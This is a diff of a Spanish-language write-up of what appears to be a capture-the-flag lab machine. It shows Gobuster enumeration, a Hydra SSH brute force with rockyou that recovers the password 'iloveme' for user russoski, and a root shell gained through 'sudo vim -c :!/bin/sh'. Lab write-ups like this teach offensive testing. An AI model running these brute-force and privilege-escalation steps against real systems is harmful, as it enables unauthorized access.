@@ -144,81 +144,50 @@ Continuamos investigando el servicio HTTP.
 Accedemos mediante:
 
 ```text
-http://TARGET_IP
+http://172.17.0.2
 ```
 
-La página está relacionada con un servicio de entrenamiento/fitness.
+NO encontramos nada importante en http
+es una pagina apache comun y corriente
 
-Durante la revisión de la página encontramos información relacionada con el usuario:
-
-```text
-Russoski
-```
-
-También encontramos una dirección de correo electrónico relacionada con el usuario.
-
----
-
-## 🔎 Análisis del código fuente
-
-Revisamos el código fuente de la página:
-
-```text
-Ctrl + U
-```
-
-Dentro del código encontramos información que indica que el usuario utiliza el mismo nombre de usuario para diferentes servicios.
-
-Por este motivo:
-
-```text
-russoski
-```
-
-se convierte en un usuario interesante para investigar.
-
----
 
 # 📂 Enumeración de directorios
 
-Utilizamos Gobuster:
+Utilizamos la erramienta Gobuster:
 
 ```bash
-gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://172.17.0.2 -w common.txt -x php,txt,js,py,html
 ```
+
+<img width="826" height="773" alt="Screenshot_2026-08-22_16_18_35" src="https://github.com/user-attachments/assets/594f9b6d-2aac-4e99-8393-dc2a1d7841e2" />
 
 ### 🔎 Resultados
 
-Se descubren algunos directorios interesantes:
+Se descubren 2 directorios interesantes:
 
 ```text
 /backup
 /important
 ```
-
 Investigamos especialmente:
 
 ```text
 /backup
 ```
-
 Dentro encontramos:
 
 ```text
 backup.txt
 ```
 
+<img width="842" height="149" alt="Screenshot_2026-08-22_16_19_46" src="https://github.com/user-attachments/assets/7105e82d-f098-4692-b260-78affdc28ba5" />
+
+
 El archivo proporciona información adicional relacionada con el usuario:
 
 ```text
 russoski
 ```
-
-### 📸 Gobuster
-
-> Agregar captura del resultado de Gobuster.
-
----
 
 # 💣 Acceso Inicial
 
@@ -233,9 +202,8 @@ Como SSH está abierto en el puerto 22, podemos intentar obtener las credenciale
 Utilizamos Hydra:
 
 ```bash
-hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP
+hydra -l russoski -P rockyou.txt ssh://172.17.0.2 -t 4 -V
 ```
-
 Hydra consigue encontrar una contraseña válida:
 
 ```text
@@ -243,35 +211,31 @@ Usuario: russoski
 Contraseña: iloveme
 ```
 
+<img width="1352" height="298" alt="Screenshot_2026-08-22_17_07_14" src="https://github.com/user-attachments/assets/1b5e6803-3b99-45db-966a-b5c517472f0c" />
+
+
 Utilizamos las credenciales para conectarnos mediante SSH:
 
 ```bash
-ssh russoski@TARGET_IP
+ssh russoski@172.17.0.2
 ```
+
+<img width="952" height="394" alt="Screenshot_2026-08-22_17_07_24" src="https://github.com/user-attachments/assets/4d18f906-206f-4317-83ea-e0c961645abe" />
+
 
 Comprobamos el usuario actual:
 
 ```bash
 whoami
 ```
-
 Resultado:
 
 ```text
 russoski
 ```
 
-También podemos comprobar nuestros grupos:
+<img width="424" height="95" alt="Screenshot_2026-08-22_17_08_02" src="https://github.com/user-attachments/assets/8d1de8ed-9d4d-47eb-836b-b0de2206a1d1" />
 
-```bash
-id
-```
-
-### 📸 Acceso Inicial
-
-> Agregar captura de la conexión SSH y `whoami`.
-
----
 
 # 🔑 Escalada de Privilegios
 
@@ -282,6 +246,9 @@ Primero comprobamos los permisos de sudo:
 ```bash
 sudo -l
 ```
+
+<img width="1664" height="185" alt="Screenshot_2026-08-22_17_08_55" src="https://github.com/user-attachments/assets/c37532d6-8825-42d9-9f17-f16ce2d72d3d" />
+
 
 Encontramos que el usuario puede ejecutar **Vim** con privilegios elevados sin necesidad de introducir una contraseña.
 
@@ -299,6 +266,9 @@ Podemos utilizar:
 sudo vim -c ':!/bin/sh'
 ```
 
+<img width="395" height="226" alt="345146861-3d9d94db-1b34-4d85-b6d7-81c3b1e9ab1b" src="https://github.com/user-attachments/assets/afbe757d-217c-4b1f-8c9f-8106640c1edf" />
+
+
 Esto permite ejecutar una shell desde Vim utilizando los privilegios elevados otorgados por `sudo`.
 
 Comprobamos nuestros privilegios:
@@ -306,18 +276,14 @@ Comprobamos nuestros privilegios:
 ```bash
 whoami
 ```
-
 Resultado:
 
 ```text
 root
 ```
 
-### 📸 Escalada de Privilegios
+<img width="659" height="142" alt="Screenshot_2026-08-22_17_24_48" src="https://github.com/user-attachments/assets/d630774d-f8d3-4479-90f8-bd22206b945a" />
 
-> Agregar captura de la ejecución de Vim y de `whoami`.
-
----
 
 # 👑 Acceso Root
 
